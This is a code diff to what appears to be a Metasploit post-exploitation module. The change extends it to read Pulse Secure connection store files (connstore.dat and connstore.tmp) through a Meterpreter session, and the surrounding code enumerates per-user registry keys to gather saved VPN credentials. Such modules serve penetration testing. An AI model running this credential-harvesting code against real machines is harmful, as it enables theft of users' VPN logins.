@@ -89,16 +89,22 @@ class MetasploitModule < Msf::Post
   def get_ives
     # parse connection profiles from Pulse Secure connection store and returns them
     # in a dict, indexed by connection identifier.
+    
+    connstore_paths = [
+      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat",
+      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.tmp"
+    ]
     begin
-      connstore_path = "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat"
-      connstore_data = session.fs.file.open(connstore_path).read.to_s
       ives = {}
-      matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
-      matches.each do |m|
-        ives[m[0]] = {}
-        ives[m[0]]["connection-source"] = m[1]
-        ives[m[0]]["friendly-name"] = m[2]
-        ives[m[0]]["uri"] = m[3]
+      connstore_paths.each do |path|
+        connstore_data = session.fs.file.open(path).read.to_s
+        matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
+        matches.each do |m|
+          ives[m[0]] = {}
+          ives[m[0]]["connection-source"] = m[1]
+          ives[m[0]]["friendly-name"] = m[2]
+          ives[m[0]]["uri"] = m[3]
+        end
       end
       return ives
     rescue Rex::Post::Meterpreter::RequestError => e
@@ -124,7 +130,6 @@ class MetasploitModule < Msf::Post
     creds = []
     # we get connection ives
     ives = get_ives
-
     # for each user profile, we check for potential connection ive
     profiles.each do |profile|
       keys = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
